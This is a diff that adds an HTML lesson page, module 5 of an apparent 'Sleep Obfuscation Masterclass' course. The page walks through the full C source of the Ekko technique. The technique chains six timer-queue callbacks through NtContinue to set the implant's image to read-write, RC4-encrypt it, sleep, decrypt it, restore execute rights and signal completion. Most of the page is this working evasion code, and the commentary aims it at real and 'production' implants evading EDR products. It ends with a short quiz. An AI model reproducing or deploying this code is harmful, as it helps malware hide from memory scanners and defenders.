@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: The Ekko Timer Chain - Ekko Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x23F1;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#8b5cf6;--accent2:#6d28d9;--gradient:linear-gradient(135deg,#8b5cf6,#6d28d9)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Ekko Course</h2>
+<span>Sleep Obfuscation Masterclass</span>
+</div>
+<a class="home-link" href="../Ekko_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Why Sleep Obfuscation Matters</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Timer Queues &amp; Waitable Timers</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. RC4 Encryption in Evasion</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. ROP Gadgets &amp; NtContinue</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module5.html"><span>5. The Ekko Timer Chain</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Context Manipulation</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Stack &amp; Return Address Handling</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain, Detection &amp; Variants</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 5: The Ekko Timer Chain</h1>
+<p class="subtitle">Six timers, six contexts, one seamless encrypt-sleep-decrypt cycle.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Walk through the complete Ekko implementation step by step &mdash; from initial setup through the 6-timer chain that performs VirtualProtect(RW), RC4 encrypt, sleep delay, RC4 decrypt, VirtualProtect(RWX), and event signaling. Understand exactly what each timer does and why the chain is ordered the way it is.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Complete EkkoObf Function</h2>
+
+<p>Ekko's entire sleep obfuscation technique is implemented in a single function: <code>EkkoObf</code>. It accepts a sleep duration in milliseconds and orchestrates the full encrypt-sleep-decrypt cycle. Let us walk through it section by section.</p>
+
+<h3>Phase 1: Variable Declaration &amp; Initialization</h3>
+
+<pre><span class="lang-tag">C</span>VOID EkkoObf( DWORD SleepTime )
+{
+    // The baseline context captured from the timer thread
+    CONTEXT CtxThread   = { 0 };
+
+    // Six operational contexts - one per timer
+    CONTEXT RopProtRW   = { 0 };  // Timer 1: VirtualProtect(RW)
+    CONTEXT RopMemEnc   = { 0 };  // Timer 2: SystemFunction032 (encrypt)
+    CONTEXT RopDelay    = { 0 };  // Timer 3: WaitForSingleObject (sleep)
+    CONTEXT RopMemDec   = { 0 };  // Timer 4: SystemFunction032 (decrypt)
+    CONTEXT RopProtRX   = { 0 };  // Timer 5: VirtualProtect(RWX)
+    CONTEXT RopSetEvt   = { 0 };  // Timer 6: SetEvent (signal done)
+
+    HANDLE  hTimerQueue = NULL;
+    HANDLE  hNewTimer   = NULL;
+    HANDLE  hEvent      = NULL;
+    PVOID   ImageBase   = NULL;
+    DWORD   ImageSize   = 0;
+    DWORD   OldProtect  = 0;
+
+    // RC4 key - hardcoded 0x55 bytes in the PoC
+    CHAR    KeyBuf[16]  = { 0x55, 0x55, 0x55, 0x55,
+                            0x55, 0x55, 0x55, 0x55,
+                            0x55, 0x55, 0x55, 0x55,
+                            0x55, 0x55, 0x55, 0x55 };
+    USTRING Key         = { 0 };
+    USTRING Img         = { 0 };
+
+    PVOID   NtContinue  = NULL;
+    PVOID   SysFunc032  = NULL;</pre>
+
+<p>Seven CONTEXT structures are declared on the stack: one baseline (<code>CtxThread</code>) and six operational contexts. The key buffer, USTRING descriptors, and API pointers are also stack-allocated.</p>
+
+<!-- ============================================================ -->
+<h2>2. Phase 2: Resource Creation &amp; API Resolution</h2>
+
+<pre><span class="lang-tag">C</span>    // Create synchronization event (auto-reset, non-signaled)
+    hEvent      = CreateEventW( 0, 0, 0, 0 );
+
+    // Create the timer queue
+    hTimerQueue = CreateTimerQueue();
+
+    // Resolve undocumented APIs at runtime
+    NtContinue  = GetProcAddress(
+        GetModuleHandleA("Ntdll"), "NtContinue" );
+    SysFunc032  = GetProcAddress(
+        LoadLibraryA("Advapi32"), "SystemFunction032" );
+
+    // Get the current process image base and size
+    ImageBase   = GetModuleHandleA( NULL );
+    ImageSize   = ((PIMAGE_NT_HEADERS)(
+        (PBYTE)ImageBase +
+        ((PIMAGE_DOS_HEADER)ImageBase)-&gt;e_lfanew
+    ))-&gt;OptionalHeader.SizeOfImage;</pre>
+
+<div class="card">
+<h4>API Resolution Strategy</h4>
+<p>Note the difference: <code>GetModuleHandleA("Ntdll")</code> is used for ntdll (which is always loaded), while <code>LoadLibraryA("Advapi32")</code> is used for advapi32 (which may not be loaded yet). In a real implant, these resolutions would likely use API hashing or PEB walking to avoid suspicious import references.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Phase 3: USTRING Setup</h2>
+
+<pre><span class="lang-tag">C</span>    // Set up the RC4 key descriptor
+    Key.Buffer         = KeyBuf;
+    Key.Length          = 16;
+    Key.MaximumLength  = 16;
+
+    // Set up the image data descriptor
+    Img.Buffer         = ImageBase;
+    Img.Length          = ImageSize;
+    Img.MaximumLength  = ImageSize;</pre>
+
+<p>The <code>Key</code> USTRING points to the 16-byte key buffer, and the <code>Img</code> USTRING describes the entire process image from <code>ImageBase</code> for <code>ImageSize</code> bytes. These structures will be passed to SystemFunction032 for encryption and decryption.</p>
+
+<!-- ============================================================ -->
+<h2>4. Phase 4: Context Capture (Timer 0)</h2>
+
+<pre><span class="lang-tag">C</span>    // Capture the timer thread's context as a baseline
+    if ( CreateTimerQueueTimer(
+            &hNewTimer, hTimerQueue,
+            RtlCaptureContext,   // Callback
+            &CtxThread,          // CONTEXT* to fill
+            0,                   // Fire immediately
+            0,                   // One-shot
+            WT_EXECUTEINTIMERTHREAD ) )
+    {
+        // Wait 50ms for the capture to complete
+        WaitForSingleObject( hEvent, 0x32 );</pre>
+
+<div class="card highlight">
+<h4>The Crucial First Timer</h4>
+<p>This timer calls <code>RtlCaptureContext</code> on the timer thread, filling <code>CtxThread</code> with a valid snapshot of all CPU registers. The 50ms wait (<code>0x32</code>) ensures the capture completes before Ekko starts cloning and modifying contexts. Note that this wait uses the <code>hEvent</code> that is not yet signaled, so it simply times out after 50ms &mdash; it is a delay, not a synchronization point.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Phase 5: Context Construction</h2>
+
+<p>Each operational context is created by cloning the baseline and modifying specific registers:</p>
+
+<pre><span class="lang-tag">C</span>        // Clone baseline into all six operational contexts
+        memcpy( &RopProtRW, &CtxThread, sizeof(CONTEXT) );
+        memcpy( &RopMemEnc, &CtxThread, sizeof(CONTEXT) );
+        memcpy( &RopDelay,  &CtxThread, sizeof(CONTEXT) );
+        memcpy( &RopMemDec, &CtxThread, sizeof(CONTEXT) );
+        memcpy( &RopProtRX, &CtxThread, sizeof(CONTEXT) );
+        memcpy( &RopSetEvt, &CtxThread, sizeof(CONTEXT) );</pre>
+
+<p>Now each context has valid segment registers, flags, stack pointer, and other state from the timer thread. The next step is customizing each context for its specific API call.</p>
+
+<h3>Timer 1: VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &amp;OldProtect)</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 1: Change image memory to RW (non-executable)
+        RopProtRW.Rsp -= 8;
+        RopProtRW.Rip  = (DWORD64)VirtualProtect;
+        RopProtRW.Rcx  = (DWORD64)ImageBase;        // lpAddress
+        RopProtRW.Rdx  = (DWORD64)ImageSize;        // dwSize
+        RopProtRW.R8   = PAGE_READWRITE;             // flNewProtect
+        RopProtRW.R9   = (DWORD64)&OldProtect;      // lpflOldProtect</pre>
+
+<h3>Timer 2: SystemFunction032(&amp;Img, &amp;Key) &mdash; Encrypt</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 2: RC4 encrypt the image
+        RopMemEnc.Rsp -= 8;
+        RopMemEnc.Rip  = (DWORD64)SysFunc032;
+        RopMemEnc.Rcx  = (DWORD64)&Img;             // Data USTRING
+        RopMemEnc.Rdx  = (DWORD64)&Key;             // Key USTRING</pre>
+
+<h3>Timer 3: WaitForSingleObject(NtCurrentProcess(), SleepTime)</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 3: Sleep for the requested duration
+        RopDelay.Rsp  -= 8;
+        RopDelay.Rip   = (DWORD64)WaitForSingleObject;
+        RopDelay.Rcx   = (DWORD64)NtCurrentProcess();  // Handle
+        RopDelay.Rdx   = (DWORD64)SleepTime;           // Timeout</pre>
+
+<div class="card warn">
+<h4>Why WaitForSingleObject on NtCurrentProcess()?</h4>
+<p>Ekko uses <code>WaitForSingleObject(NtCurrentProcess(), SleepTime)</code> as the delay mechanism. <code>NtCurrentProcess()</code> returns the pseudo-handle <code>-1</code> (0xFFFFFFFFFFFFFFFF), which refers to the current process. A process handle is never signaled (unless the process terminates), so <code>WaitForSingleObject</code> will always wait for the full timeout duration and then return <code>WAIT_TIMEOUT</code>. This is functionally equivalent to <code>Sleep(SleepTime)</code> but uses a different API that may be less monitored by some EDRs.</p>
+</div>
+
+<h3>Timer 4: SystemFunction032(&amp;Img, &amp;Key) &mdash; Decrypt</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 4: RC4 decrypt (same call as encrypt - XOR symmetry)
+        RopMemDec.Rsp -= 8;
+        RopMemDec.Rip  = (DWORD64)SysFunc032;
+        RopMemDec.Rcx  = (DWORD64)&Img;
+        RopMemDec.Rdx  = (DWORD64)&Key;</pre>
+
+<h3>Timer 5: VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect)</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 5: Restore execute permissions
+        RopProtRX.Rsp -= 8;
+        RopProtRX.Rip  = (DWORD64)VirtualProtect;
+        RopProtRX.Rcx  = (DWORD64)ImageBase;
+        RopProtRX.Rdx  = (DWORD64)ImageSize;
+        RopProtRX.R8   = PAGE_EXECUTE_READWRITE;    // Restore RWX
+        RopProtRX.R9   = (DWORD64)&OldProtect;</pre>
+
+<div class="card">
+<h4>RWX vs RX on Restore</h4>
+<p>Note that Ekko restores to <code>PAGE_EXECUTE_READWRITE</code> (RWX) rather than <code>PAGE_EXECUTE_READ</code> (RX). This is because the PoC image may need write access to its data sections after wakeup. A production implant should restore to the original protection value saved in <code>OldProtect</code> or use <code>PAGE_EXECUTE_READ</code> for the code section and separate protections for data sections.</p>
+</div>
+
+<h3>Timer 6: SetEvent(hEvent)</h3>
+
+<pre><span class="lang-tag">C</span>        // Timer 6: Signal the main thread that the cycle is complete
+        RopSetEvt.Rsp -= 8;
+        RopSetEvt.Rip  = (DWORD64)SetEvent;
+        RopSetEvt.Rcx  = (DWORD64)hEvent;           // Event handle</pre>
+
+<!-- ============================================================ -->
+<h2>6. Phase 6: Queue All Timers</h2>
+
+<pre><span class="lang-tag">C</span>        // Queue all 6 timers with staggered due times
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
+        CreateTimerQueueTimer( &hNewTimer, hTimerQueue,
+            NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );</pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete Timer Chain Execution</h4>
+<div class="flow">
+<div class="flow box">100ms: RW<br><small>VirtualProtect</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">200ms: Encrypt<br><small>SystemFunction032</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">300ms: Sleep<br><small>WaitForSingleObject</small></div>
+</div>
+<div class="flow" style="margin-top:12px;">
+<div class="flow box">400ms: Decrypt<br><small>SystemFunction032</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">500ms: RWX<br><small>VirtualProtect</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">600ms: Signal<br><small>SetEvent</small></div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Phase 7: Wait &amp; Cleanup</h2>
+
+<pre><span class="lang-tag">C</span>        // Main thread blocks until timer 6 signals the event
+        WaitForSingleObject( hEvent, INFINITE );
+    }
+
+    // Clean up the timer queue
+    DeleteTimerQueue( hTimerQueue );
+}</pre>
+
+<p>The main thread blocks on <code>WaitForSingleObject(hEvent, INFINITE)</code>. During this time, the six timers fire in sequence on the timer thread. When Timer 6 calls <code>SetEvent(hEvent)</code>, the main thread's wait is satisfied, and it resumes execution. The timer queue is then deleted to free resources.</p>
+
+<!-- ============================================================ -->
+<h2>8. Timeline Visualization</h2>
+
+<table>
+<tr><th>Time</th><th>Timer Thread</th><th>Main Thread</th><th>Image State</th></tr>
+<tr><td>t=0</td><td>Idle</td><td>Queues 6 timers, calls WaitForSingleObject(INFINITE)</td><td>RWX, plaintext</td></tr>
+<tr><td>t=100ms</td><td>NtContinue &rarr; VirtualProtect(RW)</td><td>Blocked on event</td><td>RW, plaintext</td></tr>
+<tr><td>t=200ms</td><td>NtContinue &rarr; SystemFunction032(encrypt)</td><td>Blocked on event</td><td>RW, encrypted</td></tr>
+<tr><td>t=300ms</td><td>NtContinue &rarr; WaitForSingleObject(SleepTime)</td><td>Blocked on event</td><td>RW, encrypted (SLEEPING)</td></tr>
+<tr><td>t=300ms+Sleep</td><td>Wait returns (timeout)</td><td>Blocked on event</td><td>RW, encrypted</td></tr>
+<tr><td>t=400ms*</td><td>NtContinue &rarr; SystemFunction032(decrypt)</td><td>Blocked on event</td><td>RW, plaintext</td></tr>
+<tr><td>t=500ms*</td><td>NtContinue &rarr; VirtualProtect(RWX)</td><td>Blocked on event</td><td>RWX, plaintext</td></tr>
+<tr><td>t=600ms*</td><td>NtContinue &rarr; SetEvent(hEvent)</td><td>Wakes up, resumes</td><td>RWX, plaintext</td></tr>
+</table>
+
+<p><small>* Timers 4-6 fire at their DueTime or after Timer 3's sleep completes, whichever is later. Since Timer 3 blocks the timer thread, timers 4-6 effectively fire immediately after the sleep finishes.</small></p>
+
+<!-- ============================================================ -->
+<h2>9. Chain Integrity &amp; Failure Modes</h2>
+
+<div class="card warn">
+<h4>What Could Go Wrong</h4>
+<ul>
+<li><strong>Timer ordering violation</strong> &mdash; If timers fire out of order (e.g., encrypt before VirtualProtect), the encryption would fail because the region might still be RX, or the decrypted image gets permissions changed incorrectly</li>
+<li><strong>Context corruption</strong> &mdash; If the captured baseline context is invalid or the stack pointer is misaligned, NtContinue may crash the timer thread</li>
+<li><strong>USTRING lifetime</strong> &mdash; The USTRING structures and key buffer must remain valid (on the stack) for the entire timer chain duration. Since EkkoObf blocks on the event, these stack variables remain alive</li>
+<li><strong>Image size exceeds DWORD</strong> &mdash; The USTRING Length fields are DWORD, limiting the encrypted region to ~4GB. This is not a practical limitation for implants</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: What is the correct order of Ekko's 6-timer chain?</p>
+<div class="quiz-btn" data-choice="A">A) Encrypt, VirtualProtect(RW), Sleep, Decrypt, VirtualProtect(RX), Signal</div>
+<div class="quiz-btn" data-choice="B">B) VirtualProtect(RW), Encrypt, Sleep, Decrypt, VirtualProtect(RWX), Signal</div>
+<div class="quiz-btn" data-choice="C">C) Sleep, Encrypt, VirtualProtect(RW), VirtualProtect(RX), Decrypt, Signal</div>
+<div class="quiz-btn" data-choice="D">D) Signal, VirtualProtect(RW), Encrypt, Sleep, Decrypt, VirtualProtect(RX)</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: Why does Ekko use WaitForSingleObject(NtCurrentProcess(), SleepTime) for the delay?</p>
+<div class="quiz-btn" data-choice="A">A) NtCurrentProcess() creates a special sleep-optimized handle</div>
+<div class="quiz-btn" data-choice="B">B) It is faster than calling Sleep() directly</div>
+<div class="quiz-btn" data-choice="C">C) WaitForSingleObject supports larger timeout values than Sleep</div>
+<div class="quiz-btn" data-choice="D">D) A process handle is never signaled, so it always waits the full timeout, functioning as an alternative to Sleep()</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: How does the main thread know the timer chain has completed?</p>
+<div class="quiz-btn" data-choice="A">A) It polls the timer queue status in a loop</div>
+<div class="quiz-btn" data-choice="B">B) DeleteTimerQueue blocks until all timers complete</div>
+<div class="quiz-btn" data-choice="C">C) Timer 6 calls SetEvent on a shared event handle that the main thread is waiting on</div>
+<div class="quiz-btn" data-choice="D">D) NtContinue sends a notification to the main thread</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Prev: ROP Gadgets &amp; NtContinue</a>
+<a class="primary" href="module6.html">Next: Context Manipulation &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
